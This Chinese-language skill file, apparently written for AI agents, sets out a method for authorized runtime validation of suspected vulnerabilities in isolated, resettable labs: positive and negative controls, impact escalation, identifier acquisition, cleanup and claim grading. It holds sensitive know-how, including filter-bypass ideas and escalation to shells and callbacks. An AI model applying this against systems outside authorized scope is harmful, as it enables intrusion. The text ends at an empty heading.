---
name: runtime-verification-negative-controls
description: Use when designing authorized runtime validation, negative controls, exploitability proof, impact escalation, 对外提交资格 security claims, Burp or curl reproduction, browser reproduction, or evidence collection for suspected vulnerabilities in controlled test environments.
---

# 动态验证与负控设计

## 权威边界

本 Skill 只保留审计方法，不定义 JSON schema、报告模板正文、提交资格状态、账号对象矩阵字段或完成核验规则。

- 字段、状态族、EVID 命名以对应中文 schema、template 和 validator 为准。
- 报告版式只引用 `templates/单漏洞提交报告模板.md`、`templates/赏金提交总入口模板.md`、`templates/完成核验模板.md`，本 Skill 不复制模板正文。
- 账号对象事实只引用账号对象矩阵和证据链；本 Skill 不重新定义账号对象矩阵字段、平台表单或正文写法。
- 提交资格只由 `evidence/赏金资格.json` 和报告与复核类提交门禁裁决；本 Skill 只提示需要外部门禁，不生成提交资格状态。
- Web 浏览器复现、截图、trace、network、console、storage/session 证据必须按 `skills/审计基础方法类/PlaywrightMCP运行证据归档/SKILL.md` 归档并回链 evidence。


## 如何使用这个 Skill

这个 Skill 用来把静态审计线索、扫描器告警、漏洞报告声明或其他模型/工具 的结论，转化为可复核的运行态证据。它不是“温和复现模板”，也不是“只读验证清单”；它要求在自有、授权、隔离、可重置、可清理的环境中，用足够强的正控证明真实安全影响，用负控排除误报，用清理证据约束副作用，并把结论精确分级为 `technical_confirmed / candidate / blocked / rejected`。

使用时先写一句目标句：

```text
我要验证：{source/入口/报告声明} 是否能在 {授权实验环境} 中通过 {trace/运行请求} 到达 {sink/安全边界}，并证明 {最高可证明影响}，同时用 {负控} 排除正常行为、缓存、随机、权限本来允许、工具误报或弱 payload 阴性。
```

### 适用场景

在以下场景调用本 Skill：

- `source → trace → sink` 已经基本闭合，需要把 `candidate` 升级为 `technical_confirmed`。
- 扫描器、DAST、SAST、SCA、Secret 工具给出 callback、响应差异、错误栈、SARIF trace、依赖版本或疑似 secret，需要人工复核。
- 漏洞报告缺少强正控、负控、运行日志、浏览器执行、Web 端复现、清理证明、最高影响追踪或声明边界。
- 需要为 SQL/NoSQL/LDAP/XPath 注入、命令执行、代码执行、SSRF、XSS、文件读写、上传、归档解压、XXE、反序列化、SSTI、鉴权绕过、IDOR、CSRF、开放重定向、响应头、供应链、Secret、配置类风险设计动态验证。
- 弱 payload 失败后，需要判断是 payload 不匹配、观察点错误、分支未触发、防护有效，还是确实应当 rejected。
- 需要写可复制的 curl、Burp、浏览器复现步骤，并明确 allowed claims 与 forbidden claims。

### 不适用场景

不要用本 Skill 处理：

- 部署、恢复、监控、调度、容器维护、扫描器平台运营、CI 编排等运维类工作。
- 第三方未授权真实系统、真实生产用户数据、真实生产凭据、真实云 metadata credential、不可清理副作用或不可逆破坏。
- 没有测试账号、测试对象、日志观察、快照/重置/清理能力，却要求直接写 `technical_confirmed` 的场景。
- 只有工具输出、截图、外部模型/工具自述、代码片段或 200 响应，没有运行态证据与负控的场景。

### 每次交付的最小内容

每次使用本 Skill，至少输出：

```text
验证目标：
授权范围：
环境快照：
账号/对象/租户：
账号矩阵：
标识符获取：
入口请求：
Source 与控制粒度：
Trace 与 Sink：
官方安全模型：
Baseline：
Strong Positive：
Escalation：
Negative Controls：
观察点：
清理/重置：
最高已证明影响：
停止继续升级原因：
结论：technical_confirmed / candidate / blocked / rejected
外部门禁引用（仅引用，不裁决）：
Allowed Claims：
Forbidden Claims：
```

检验句：**如果别人只拿这份输出，能否在同等授权环境里复现、观察、对照、清理，并知道哪些话可以说、哪些话不能说？** 不能就继续补证。

## 核心原则

### 1. 默认授权实验模式，不默认保守弱验证

默认验证环境是自有 Docker、CTF、靶场、本地可重置环境、隔离预发或明确授权的测试环境。只要在范围内、可观察、可清理、可回滚，就应当推进到足够证明漏洞价值的强正控，而不是停在安全 marker。

在授权实验模式中，允许使用：

- 真实差异：响应、日志、数据库、缓存、队列、文件、浏览器、服务端请求的可观察差异。
- 受控数据读取：测试表、测试对象、测试文件、测试 cookie、测试 token、非敏感系统指纹。
- 受控写入/修改/删除/覆盖：只针对测试对象、测试目录、测试表、测试队列、可恢复配置或快照环境。
- 受控命令结果：`id/whoami/pwd/uname`、退出码、stdout/stderr、受控临时文件。
- 受控回连：自有 HTTP/DNS/OOB、受控内网 canary、metadata mock。
- 受控批量：测试 ID 集合、测试租户、测试对象矩阵，用于证明批量越权、逐项授权缺失或资源影响。
- 受控持久化与 shell/回连：只在可重置靶场或本地实验环境内证明影响，必须记录启动、范围、停止和清理/重置结果。
- 最小资源压力：只在隔离环境内做曲线、阈值、恢复时间和停止条件证明。

真正边界是：不越出授权范围，不打第三方真实系统，不读取或泄露真实生产用户数据，不复用真实凭据，不访问真实云 metadata credential，不制造不可清理副作用，没有证据不写 `technical_confirmed`。

### 2. 动态验证服务于证据链，不替代证据链

动态现象必须回到 source、trace、sink、防护缺口和影响语义：

- 只有 source 不是漏洞。
- 只有 sink 不是漏洞。
- 只有扫描器 finding 不是漏洞。
- 只有 外部模型/工具自述不是证据。
- 只有 200、500、截图、callback、marker、错误栈、版本号不是 technical_confirmed。
- 只有弱 payload 阴性也不是 rejected。

`technical_confirmed` 必须有连续证据链：入口可达、source 可控、参数绑定、trace 连续、sink 危险参数被污染、防护不足或被绕过、强正控证明真实影响、负控成立、清理完成或无副作用、声明边界清楚。

### 2.1 动态强验证证明“能发生”，官方安全模型决定“能否作为漏洞提交”

动态验证可以证明某个行为在运行态真实发生，但不能单独决定它是不是 对外可提交漏洞。进入报告前，还必须裁决官方 SECURITY、安全策略、API 文档、权限模型、对象模型、默认配置、release note、known issue、expected behavior、accepted risk、范围或官方已知拒绝（外部裁决） 和测试范围是否支持当前声明。

常见分层：

| 动态结果 | 官方门禁状态 | 允许结论 |
|---|---|---|
| 强正控、负控、清理都成立 | 官方模型说明该边界应被保护，且当前版本/默认配置/范围内受影响 | `technical_confirmed` 且可进入 对外提交资格 |
| 强正控成立 | 官方模型未读完、scope unknown、默认配置 unknown、known issue 未去重 | `需要外部门禁裁决` 或 `candidate`，不能提交强报告声明 |
| 强正控成立 | 官方明确是 expected behavior、trusted admin normal use、accepted risk、范围或官方已知拒绝（外部裁决） 或 hardening only | 不得按新漏洞 对外提交资格；除非证明新主体、新边界、新默认配置或缓解绕过 |
| 动态现象只证明功能可用 | 官方定义该功能为正常能力，且没有跨用户、跨租户、跨沙箱、跨网络或敏感数据影响 | `rejected` 或 `情报类/加固类外部裁决或 hardening only` |

检验句：**我的强正控是在证明安全边界被突破，还是只是在证明官方本来允许的功能能用？如果官方模型盖不住当前声明，这个 finding 只能降级或补读补证。**

### 3. 正控要证明漏洞语义，不证明“我能发请求”

强正控要证明安全语义发生变化：

- SQLi：查询语义变化、布尔/时间稳定差异、常量回显、测试数据读取、受控写入。
- RCE/CMD：命令执行语义、进程身份、工作目录、stdout/stderr、受控文件或受控回连。
- SSRF：服务端请求、最终 URL/IP、重定向后目标、内网 canary、响应可读性或 metadata mock。
- XSS：浏览器执行、DOM/Console/Network、存储传播、目标角色触发、同源能力边界。
- 文件类：最终路径、base 越界、受控文件读写、web 可达、执行/非执行边界、覆盖/追加模式。
- IDOR/鉴权：A/B 主体、A/B 对象、租户边界、读写差异、审计日志证明主体对象不匹配。
- SCA：运行包加载、调用路径可达、漏洞条件满足、可控输入进入漏洞组件。
- Secret：攻击者可获得、非占位、未吊销、权限范围、轮换状态；报告中不得暴露原值。

检验句：**这个正控失败时，我能定位是 source、trace、sink、防护、payload、观察点还是权限条件的问题吗？** 如果不能，正控设计不合格。

### 4. 负控用于增强证据，不用于削弱验证

负控的目的不是把 payload 变弱，而是证明正控差异由漏洞条件导致。每个负控只改变一个关键变量：字段、主体、对象、租户、token、Origin、payload 条件、URL host、路径、编码、配置或修复版本。

负控必须与 claim 对齐：

- 声称 SQLi，就要 true/false、time/no-time、安全值、参数化修复或查询日志对照。
- 声称 IDOR，就要 A/B 用户、A/B 对象、跨租户、自己对象与他人对象对照。
- 声称 SSRF，就要允许 host、禁止 host、重定向后目标、本地 canary、外网 canary、metadata mock 对照。
- 声称 XSS，就要编码后值、不同输出上下文、浏览器不执行、安全模板/CSP 对照。
- 声称 RCE，就要普通值、移除字段、禁止命令、命令输出差异、修复后对照。
- 声称文件越界，就要 base 内合法文件、base 外 canary、不存在文件、编码/双编码对照。

正控与负控结果相同，不得 technical_confirmed。没有负控，不得写高置信。弱 payload 失败，不能直接 rejected。

### 4.1 ID 类动态验证先证明标识符获取链和账号矩阵

IDOR、未授权、对象级授权、批量越权、导出越权、跨租户访问这类验证，不能只证明“把对象 ID 换成另一个值后请求成功”。动态验证必须先证明两个前置条件：

1. **标识符获取链**：攻击者如何从自身可达路径获得 `user_id`、`object_id`、`tenant_id`、`workspace_id`、`project_id`、`file_id`、`document_id`、`workflow_id`、`plugin_id`、分享 token、lookup handle、资源 URI 或其他对象标识符。
2. **账号对象矩阵**：attacker、owner、victim、control、cleanup 的账号用途、用户名或邮箱、账号对象矩阵必要事实、主体 ID、租户/工作区、角色、token/cookie 引用、对象归属和清理责任。

单对象结论只需要证明这个具体 ID 来自攻击者可达路径，但结论必须写窄。批量、全量、全租户、全用户、全工作区或广义影响，必须证明 ID 能批量、持续、枚举、列表、搜索、导出、日志泄露、关系链、分享页、可预测或可推导获得。

管理员手工给出的 ID、报告作者笔记里的 ID、聊天上下文里的 ID、历史附件里的 ID，只能作为定位样本，不能当攻击者可获得路径。只有“已知 ID 后可利用”时，不得写高价值 `technical_confirmed`；通常降级为 `candidate` 或 `blocked`，有明确不可获得证据时才写 `rejected`。

检验句：**如果删掉我手工提供的 ID，攻击者还能不能自己拿到目标 ID？如果报告写批量，攻击者能不能稳定拿到足够多 ID？**

### 5. 最高影响必须追到边界，并写停止原因

每个候选都按以下阶梯推进：

```text
可触发 -> 可控 -> sink 执行 -> 强正控 -> 可读/可写/可越权/可执行/可横向 -> 可组合 -> 负控 -> 清理 -> 声明边界
```

停止继续升级必须写具体原因：

- 已达到当前授权环境内最高可证明影响。
- 防护经同变量、同路径、同上下文证据证明有效。
- 缺测试账号、对象、租户、日志、回连、快照或清理能力。
- 当前环境不支持触发该 sink。
- 继续验证会越出授权范围、触碰真实用户数据、真实凭据、第三方资源或不可清理副作用。

禁止把低层现象夸大：callback-only SSRF 不是内网访问 technical_confirmed；marker-only RCE 不是命令执行 technical_confirmed；reflect-only XSS 不是浏览器执行 technical_confirmed；error-only SQLi 不是数据读取 technical_confirmed；version-only SCA 不是组件漏洞可达 technical_confirmed；secret-regex-only 不是有效凭据泄露 technical_confirmed。

### 6. 工具和公开方法只能辅助，最终判断必须语义复核

CodeQL、Semgrep、SAST、DAST、Burp Scanner、Nuclei、SCA、Secret scanner、grep、正则、IDE 跳转和其他模型/工具 都只能提供线索。工具 trace 要拆成 source candidate、propagation candidate、sanitizer candidate、sink candidate，再人工确认：

- source 是否真由攻击者控制。
- propagator 是否传播同一个后继值。
- sanitizer 是否作用于同变量、同路径、同上下文。
- sink 是否命中危险参数而不只是函数名。
- trace 是否在当前配置、profile、feature flag、依赖注入、路由缓存、异步 consumer 下可达。

## 审计目标

本 Skill 要证明或排除：

1. 漏洞条件能否在授权实验环境中真实触发。
2. 运行请求是否触发与静态 trace 同一 handler、同一变量、同一 sink。
3. source 是否仍由攻击者或低权限主体控制，并以足够粒度影响危险参数。
4. 防护是否真实执行，是否覆盖同变量、同路径、同上下文，是否可绕过。
5. 强正控是否证明真实安全影响，而不只是 marker、callback、错误或响应码。
6. 负控是否能排除缓存、随机、限流、错误页、WAF、正常权限、正常功能、工具误报。
7. 最高可证明影响是什么：数据读取、对象越权、状态改变、服务端请求、文件越界、命令/代码执行、浏览器执行、组件可达、有效 secret、资源影响或业务安全影响。
8. 副作用是否限定在测试对象内，是否可观察、可清理、可恢复。
9. 结论应为 `technical_confirmed`、`candidate`、`blocked` 还是 `rejected`。
10. 哪些声明允许写入报告，哪些声明必须禁止。
11. 如果漏洞依赖对象 ID、分享 token、lookup handle 或 URI，攻击者如何获得这些标识符，能支持单对象、多对象、批量还是不可获得结论。
12. 如果验证依赖多账号、多对象、owner/victim、跨租户或清理动作，账号矩阵是否可复核，内部材料是否有账号对象矩阵必要事实，账号对象矩阵事实是否足以支撑报告阶段自包含复现；非账号类敏感材料处理边界不能替代账号对象矩阵事实。
13. 如果结论要进入报告或对外提交，官方安全模型、scope、默认配置、known issue、expected behavior、accepted risk、范围或官方已知拒绝（外部裁决） 和对外提交限制是否已经裁决。

要主动排除：

- 响应差异来自缓存、随机 token、统一错误页、重试、限流、WAF、网络抖动。
- 对象本来公开、属于自己、由管理员正常权限访问，或对象 ID 攻击者不可获得。
- 命令、模板、SQL、文件、SSRF sink 没有使用污染值。
- 防护在运行态有效，且作用在同变量、同路径、同上下文。
- 组件版本存在但未打包、未加载、不可达或漏洞条件不满足。
- secret 是占位符、测试值、已轮换、不可被攻击者获得或无权限。

## 输入材料

动态验证前必须收集可复核材料。不要只看扫描器摘要或报告结论。

### 代码与调用链材料

- 路由、Controller/Handler/Action/Resolver、RPC、GraphQL、WebSocket、CLI、webhook、queue consumer、event listener、cron、file import。
- Middleware、filter、interceptor、guard、policy、gate、AOP、decorator、权限注解、CSRF/CORS/security header 配置。
- Source 绑定：request object、body parser、DTO、VO、FormRequest、Serializer、Model binder、Pydantic、strong parameters、schema。
- 传播路径：service、usecase、manager、helper、trait、mixin、repository、DAO、mapper、ORM scope、model、client、parser、template。
- Sink 位置：SQL/NoSQL/LDAP/XPath、命令/代码/表达式/模板、文件/上传/解压/XML/反序列化、SSRF/redirect/header、鉴权判断、业务敏感操作。
- 防护：参数化、allowlist、canonicalize、escape、encode、sanitize、parser 安全配置、沙箱、权限过滤、对象级授权、租户过滤。

### 运行材料

- 完整请求：method、path、query、header、cookie、body、Content-Type、multipart、GraphQL variables、WebSocket message、CLI 参数、queue message。
- 测试身份：匿名、低权限、无权限、不同租户、管理员测试账号、service account、目标角色。
- 测试对象：自己对象、他人测试对象、跨租户对象、公共对象、测试文件、测试表、测试记录、测试 token、测试 cookie。
- 多主体、对象边界或登录态相关结论必须引用账号对象矩阵、对象归属、主体边界、token/cookie 引用和清理责任；报告阶段按唯一模板渲染必要复现事实，本 Skill 不重新定义账号凭据字段或正文写法。
- 标识符获取材料：对象 ID、用户 ID、租户 ID、文件 ID、分享 token、lookup handle、资源 URI 来自列表、详情、搜索、导出、日志、关系链、分享页、可预测序列还是批量接口；必须区分手工样本、单对象可得、多对象可得、批量可得和不可得。
- 环境信息：commit、版本、镜像、依赖包、profile、feature flag、路由缓存、配置、数据库方言、操作系统、容器/宿主边界。
- 观察点：响应、header、重定向链、时间差、应用日志、访问日志、审计日志、trace ID、数据库/缓存/队列/文件/对象存储、DNS/HTTP 回连、浏览器 DevTools。
- 清理能力：删除测试对象、回滚测试记录、恢复字段、清理缓存/队列、删除测试文件、撤销 token、恢复快照。

### 复核材料

- 扫描器原始输出、规则 ID、CWE、severity、confidence、dataflow path、request/response、callback 记录。
- 报告复现步骤、截图、视频、curl、Burp 记录、浏览器操作、修复说明。
- 依赖 manifest/lockfile、运行包、构建产物、容器镜像、组件加载证据。
- 其他模型/工具 输出只作为线索，不能作为证据。

### 官方安全模型材料

当动态验证结果准备写成 `technical_confirmed`、高危、严重、跨用户、跨租户、未认证、默认配置受影响、RCE、SSRF 内网访问、数据泄露、账号接管、沙箱逃逸、有效凭据泄露或其他 对外提交声明时，必须补齐官方安全模型材料：

- SECURITY、安全策略、披露范围、测试限制、safe harbor、范围或官方已知拒绝（外部裁决）、提交材料质量要求。
- README、部署文档、默认配置、示例配置、生产建议、危险功能开关。
- API 文档、权限模型、角色说明、scope、ACL、对象归属、多租户/工作区/项目/文件/密钥/任务隔离说明。
- 管理员手册、插件/脚本/工作流/沙箱/URL fetch/webhook/导入导出/文件预览等危险能力的信任边界。
- release note、changelog、migration guide、security advisory、known issue、known limitation、accepted risk、expected behavior、won't fix、duplicate 线索。
- 官方 issue/discussion 中维护者对安全模型、设计意图、默认配置、已知风险或重复问题的说明。

官方材料不是“保守不测”的借口；授权实验环境仍然要追最高影响。官方材料的作用是约束最终声明：哪些动态结果能写成新漏洞，哪些只能写成已知风险、预期行为、配置加固、范围外、需去重或 `needs-official-baseline`。

## Source 识别

Source 识别要回答四个问题：谁能控制、从哪里进入、控制到什么粒度、是否仍影响 sink。

### HTTP/API Source

- query：`id`、`url`、`callback`、`redirect`、`file`、`path`、`sort`、`order`、`filter`、`q`、`tenant`、`owner`、`returnUrl`。
- path：REST resource id、slug、文件名、租户 segment、通配符、扩展名、路由正则捕获。
- body：form、JSON、XML、GraphQL variables、protobuf、数组、嵌套对象、批量列表、对象 key、operator、字段名。
- header：Authorization 派生字段、Host、Origin、Referer、X-Forwarded-*、Content-Type、Accept、User-Agent、自定义业务 header。
- cookie：业务 cookie、remember token、locale、tenant、redirect、非 HttpOnly 测试 cookie。
- multipart：文件名、MIME、magic bytes、压缩包 entry、文件内容、metadata。

### 非 HTTP Source

- GraphQL query、mutation、variables、alias、directive、batch query。
- WebSocket handshake、message、topic、room、客户端事件 payload。
- CLI 参数、stdin、环境变量、导入文件、配置文件。
- webhook、OAuth/OIDC/SAML/SCIM/LDAP 同步字段。
- queue/event/job payload、cron 从数据库/缓存读取的存储污染值。
- CSV、Excel、XML、JSON、YAML、ZIP、TAR、Office 文件导入。
- 用户可编辑模板、表达式、规则、工作流、报表、通知、富文本。

### 身份与对象 Source

- session/JWT/OAuth claim：`sub`、`aud`、`iss`、`scope`、`role`、`tenant`、`groups`、`email`、`exp`、`nbf`。
- API key scope、service account 权限、HMAC 签名字段、nonce、timestamp。
- 前端传入的 `user_id`、`owner_id`、`tenant_id`、`role`、`permission`、`price`、`status`、`isAdmin`。
- 对象 ID 是否攻击者可获得，是否属于 A/B 测试主体，是否跨租户。
- 对象标识符获取路径：列表、详情、搜索、导出、日志、关系链、分享页、可预测序列、分页接口、批量接口、客户端缓存、前端状态。
- 对象标识符规模边界：单个样本、同类多个、分页批量、持续获取、可枚举、可推导、不可获得。
- 服务端是否把前端传入的 ID 重绑定为当前主体、当前租户、owner、server lookup 或 route model binding 后的对象。

### 存储型 / 二次污染 Source

- 数据库字段、缓存值、对象存储 metadata、搜索索引、消息队列、日志、模板、配置。
- 必须证明写入端和触发端：谁能写、写到哪里、何时读取、谁触发、如何进入 sink。
- 记录污染 marker、记录 ID、job ID、消费日志、触发时间和负控。

### Source 动态裁决

每个 source 必须裁决：

```text
source_name:
  entry:
  actor:
  privilege:
  controllability: FULL / PARTIAL / FIELD / STRUCTURAL / CONDITIONAL / STORED / UNRESOLVED
  granularity:
  server_override:
  trust_boundary:
  reaches_backend: yes/no/unknown
  evidence:
```

如果字段只在前端、Swagger、文档、Mock、fixture 或日志中出现，不算后端 source。如果字段被 session、claim、服务端查询、默认配置或随机值覆盖，必须追覆盖后的值。

## Sink 识别

Sink 识别必须定位危险 API、危险参数、执行条件、观察点和影响上限。

### 注入与查询 Sink

- SQL：JDBC Statement、PreparedStatement 拼接、MyBatis `${}`、XML Mapper、SQL Provider、JPA/Hibernate nativeQuery/HQL 拼接、PDO/mysqli raw query、query builder raw、排序/列名/表名/limit/group 动态片段。
- NoSQL/DSL：Mongo filter/update/delete/aggregation、`$where`、operator injection、Elasticsearch DSL/script query、Redis key/command-like 拼接、Cypher/Gremlin 图查询。
- LDAP/XPath：filter、DN、XPath 表达式、XML path 查询。
- 观察点：错误差异、布尔差异、时间差、常量回显、测试数据读取、受控写入、查询日志、权限边界。

### 执行类 Sink

- OS 命令：shell 字符串、`exec/system/shell_exec/passthru/proc_open/popen`、`Runtime.exec`、`ProcessBuilder`、Node `child_process`、Python `subprocess/os.system`、Go `os/exec`、.NET `Process.Start`。
- 动态代码：`eval`、`Function`、`assert` 字符串、ScriptEngine、反射、插件加载、表达式引擎。
- 模板/表达式：SSTI、SpEL、OGNL、JEXL、MVEL、EL、Twig/Blade/Smarty/Jinja/ERB raw 或动态模板。
- 观察点：返回值、stdout/stderr、进程用户、工作目录、受控文件、DNS/HTTP 回连、沙箱边界。

### 文件与解析 Sink

- 文件读取：本地文件、对象存储 key、下载、预览、模板 include、`sendFile`、`file_get_contents`、`Files.read*`、`open`。
- 文件写入：导出、缓存、日志、临时文件、对象存储 put、配置写入。
- 上传：保存路径、文件名、扩展名、MIME、magic bytes、预览转换、下载访问、执行面。
- 解压：ZIP/TAR/7z/Phar entry、symlink、hardlink、绝对路径、盘符、覆盖行为。
- XML/反序列化：DOM/SAX/StAX/SimpleXML/lxml、ObjectInputStream、unserialize、pickle、YAML unsafe load、Jackson/Fastjson polymorphic、BinaryFormatter。
- 观察点：最终路径、base 越界、文件内容、web 可访问性、执行性、parser 外部请求、OOB、资源限制。

### Web 与协议 Sink

- SSRF：HTTP client、URL fetch、webhook tester、image/PDF/preview fetcher、proxy、redirect-following client、URL parser、metadata fetch。
- XSS：HTML body、attribute、URL、JS、CSS、JSON-in-script、Markdown、富文本、SSR hydration、DOM sink。
- 开放重定向/响应头：Location、redirect helper、Set-Cookie、Content-Disposition、CORS、CRLF header。
- CSRF：状态变更 handler、批量操作、删除、配置修改、密钥生成、导入导出。
- 观察点：服务端请求、最终 URL/IP、浏览器执行、同源能力、header 注入、状态变更。

### 鉴权与业务 Sink

- Auth decision：policy、gate、guard、hasRole、authorize、ownership check、tenant filter。
- 对象访问：Repository 查询条件、ORM scope、GraphQL resolver、批量接口逐项授权。
- 业务敏感：导出、审批、邀请、权限分配、支付、订单、密钥管理、审计日志。
- 观察点：A/B 账号、对象归属、租户边界、读写差异、状态回滚、审计日志。

## Transform / 防护检查

动态验证要证明防护是否真实生效或真实可绕过，而不是看到防护名称就接受。

### 通用防护裁决

- 参数化是否覆盖全部动态片段；表名、列名、排序、方向、limit、group、operator、JSON path 不能靠值绑定保护。
- allowlist 是否在 decode、normalize、canonicalize 后执行；失败是否阻断；是否覆盖大小写、双重编码、Unicode、路径分隔符、IPv4/IPv6 表示。
- escape/encode 是否匹配当前上下文：HTML body、attribute、JS、URL、CSS、JSON、header、SQL、LDAP、XPath、shell、路径不能混用。
- canonicalize/realpath/normalize 是否早于权限判断和 base 约束；是否处理符号链接、Windows 盘符、对象存储 key、大小写文件系统。
- SSRF 是否校验最终 URL、重定向后 URL、解析后 IP、scheme、port、IPv4/IPv6、本地/内网/metadata、DNS rebinding、userinfo、parser mismatch。
- 权限是否对象级和租户级；service/repository 查询是否绑定当前主体和 tenant；批量操作是否逐项授权。
- CSRF token 是否覆盖 JSON、multipart、AJAX、method override、CORS 简单请求；Origin/Referer/SameSite 只是补充。
- parser 是否禁用外部实体、危险多态、unsafe load、模板 raw、表达式危险函数。
- 上传/解压是否验证最终落点、执行性、下载鉴权、预览转换和二次处理。

### 防护绕过验证原则

- 先证明防护位置和变量，再设计绕过。
- 对 allowlist 尝试大小写、编码、双重编码、混合分隔符、尾随点、短 IP、IPv6、userinfo、重定向、符号链接、对象 key 变体。
- 对参数化检查动态片段：排序字段、方向、表名、列名、JSON path、operator、limit、whereRaw、nativeQuery。
- 对权限检查做 A/B 主体和对象对照；登录态不等于对象级授权。
- 对 XSS 检查真实输出上下文和浏览器执行；HTML body 安全不代表 script、attribute、URL 上下文安全。
- 对命令执行检查 shell 是否参与、参数数组是否真实避免解释、选项注入是否仍可控。

## 路由与调用链追踪

动态验证前必须把运行请求映射到代码路径，确认运行态触发的 handler/sink 与静态 trace 一致。

### 入口枚举

- route、annotation、attribute、decorator、controller/action。
- servlet/filter/listener、middleware、interceptor、guard、policy。
- GraphQL resolver、RPC endpoint、WebSocket handler。
- CLI command、queue consumer、event listener、cron job、webhook、file import。
- CMS/plugin hook、admin ajax、REST route、server action、SSR endpoint。

### 请求到 handler

记录：

```text
Request/Message: METHOD /path 或 topic/command
Handler: file:line class.method
Auth boundary: middleware/filter/guard/policy
Parameters: 字段列表
Runtime marker: AUDIT_RUN_{timestamp}_{shortid}
```

### handler 到 sink

逐跳记录：

```text
handler -> service -> repository/helper/client/parser/template -> sink
file:line -> function -> input variable -> output variable -> branch/auth -> next call
```

必须处理：父类、接口、trait、helper、middleware、decorator、依赖注入、注解/attribute、AOP、反射、动态调用、事件、队列、定时任务、异步 job、mapper XML、ORM scope、模板 partial。

### 异步与二次触发

队列、事件、定时任务、存储型污染必须记录两端：

- 生产端：请求如何写入消息、数据库、缓存、文件或对象存储。
- 消费端：消息何时处理，如何被读取，如何到达 sink。
- 观察点：message ID、job ID、日志、重试、延迟、死信、消费者实例。
- 负控：安全消息、移除字段、未触发 job、不同主体消息、不同租户消息。

如果运行请求触发的不是报告中的 handler/sink，不能 technical_confirmed；重新定位或降级。

## 数据流追踪步骤

### 第 1 步：定义验证目标和最高影响目标

```text
Finding:
漏洞类型:
当前状态: candidate / blocked
基础 claim:
最高影响目标:
测试范围:
边界:
清理方式:
必需标识符:
标识符获取路径:
账号对象矩阵:
security_model_status:
target_scope_status:
official_known_status:
预期行为 / 风险承接受性说明:
accepted risk 说明:
范围外裁决:
外部门禁引用:
```

### 第 2 步：准备主体、对象和 canary

- 主体 A：低权限攻击者测试账号。
- 主体 B：无权限或不同租户对照账号。
- 主体 C：管理员或目标角色测试账号，仅用于存储型、受害者上下文或管理后台触发。
- 对象 A：攻击者自己的测试对象。
- 对象 B：另一个测试主体或租户的对象。
- Canary：测试表、测试文件、测试 cookie、测试 token、测试 URL、测试 DNS、测试内网服务、metadata mock。
- 多主体、对象边界或登录态相关结论必须引用账号对象矩阵、对象归属、主体边界、token/cookie 引用和清理责任；报告阶段按唯一模板渲染必要复现事实，本 Skill 不重新定义账号凭据字段或正文写法。
- 标识符清单：记录验证需要的 ID / handle / token / URI，说明它来自攻击者列表、详情、搜索、导出、日志、关系链、分享页、可预测序列、批量接口、手工样本、未知或不可获得。

### 第 3 步：构造 baseline 请求

- 用真实浏览器、合法 API client 或原始业务流程抓取请求，不手造未知协议细节。
- 保留 method、path、header、cookie、Content-Type、body、CSRF token、Origin/Referer。
- 添加唯一 marker，记录 request ID、trace ID、账号、对象、前置状态。
- baseline 必须证明正常功能可用，也要记录正常响应、日志和副作用。

### 第 4 步：确认参数绑定和可控性

- 字段进入后端的位置、DTO/Model/Schema 转换、默认值、类型转换。
- 是否被 session、claim、配置、服务端常量、数据库查询值覆盖。
- 可控粒度：完整值、片段、字段名、operator、URL host/path、文件名、表达式、对象 ID。
- 存储型 source 要证明写入端和读取端闭合。
- 如果是对象 ID、租户 ID、文件 ID、分享 token、lookup handle 或 URI，要先证明攻击者获得路径；只靠手工样本不能升级 technical_confirmed。
- 如果是批量接口，要证明每个元素是否逐项授权、逐项记录失败，不能只验证数组中第一个 ID。

### 第 5 步：执行强正控

- SQLi 用 boolean/time/UNION/测试表读取/受控写入，不只用单引号。
- RCE 用命令输出、身份、工作目录、受控文件、受控 OOB，不只用 marker。
- SSRF 用 callback、DNS、内网 canary、重定向、metadata mock、响应可读性，不只用公网 callback。
- XSS 用真实浏览器执行、DOM/Console/Network、同源测试 endpoint、存储传播，不只用反射。
- IDOR 用攻击者可获得的目标 ID、A/B 账号对象读写差异、跨租户对照、owner/victim 视角和审计日志，不只改对象 ID 看 200。
- 文件类用 base 内外 canary、系统只读指纹、最终路径，不只看下载成功。

### 第 6 步：继续追踪最高影响

正控成立后继续问：

- 能否读到测试敏感数据？
- 能否跨对象、跨角色、跨租户？
- 能否从攻击者入口获得单个或批量目标 ID？
- 能否写入受控测试记录并回滚？
- 能否访问受控内网 canary 或 metadata mock？
- 能否读取服务端响应而不仅是发出请求？
- 能否证明服务端执行语义而不仅是回显？
- 能否触发存储型传播或目标角色上下文？
- 能否和上传、SSRF、CSRF、XSS、SCA、配置错误组合？

若不继续追踪，必须说明停止原因。

### 第 7 步：执行负控

至少选择一个；高风险结论通常需要多个：

- 安全值/合法值对照。
- boolean true/false、time/no-time、UNION 常量/非法列数。
- 移除关键字段或改为不可控字段。
- 无权限主体、自己对象、他人对象、不同租户。
- 修复后版本、安全配置开启、feature flag 关闭。
- 不同编码/规范化路径被拦截对照。

### 第 8 步：对比差异和观察点

记录：状态码、响应体、header、页面变化、重定向链、时间差、应用日志、审计日志、错误栈、权限决策、sink 调用、数据库/缓存/队列/文件/对象存储/服务端请求/浏览器执行。说明差异是否只由目标变量导致。

### 第 9 步：清理和回滚

- 删除测试对象、测试记录、测试文件、缓存 key、队列消息。
- 恢复测试字段、撤销测试 token、清理上传文件和解压文件。
- 记录清理命令或 Web 操作，确认清理结果。
- 高强度验证前必须确认环境可快照、可重置或可清理；无法恢复时停止继续升级并写清原因。

### 第 10 步：裁决结论

```text
正控结果:
最高已证明影响:
负控结果:
清理结果:
官方安全模型:
scope / known issue / expected behavior / accepted risk / 范围或官方已知拒绝（外部裁决）:
外部门禁引用:
仍可升级方向:
停止原因:
状态: technical_confirmed / candidate / blocked / rejected
Allowed Claims:
Forbidden Claims:
Missing Evidence:
```

## 必检证据点

### 路由证据

- method/path/handler 或 queue/topic/command。
- route 注册、当前配置启用、feature flag、profile、路由缓存。
- 认证/访问控制边界、middleware 顺序。

### Source 证据

- 字段来源、绑定变量、可控主体、控制粒度。
- 低权限、匿名、跨租户、外部 webhook、存储污染可控性。
- 是否被服务端覆盖、类型转换、默认值或可信 claim 替换。

### 标识符获取证据

- `EVID_IDENTIFIER_ACQUISITION`：对象 ID、用户 ID、租户 ID、文件 ID、分享 token、lookup handle 或 URI 的攻击者获取路径。
- 必须写明获取主体、入口、请求/页面、响应字段、规模边界：单对象、多对象、批量、持续、可枚举、可推导或不可获得。
- 手工样本、管理员视角 ID、历史报告 ID、聊天上下文 ID 只能定位，不得当作攻击者可获得路径。

### 账号矩阵证据

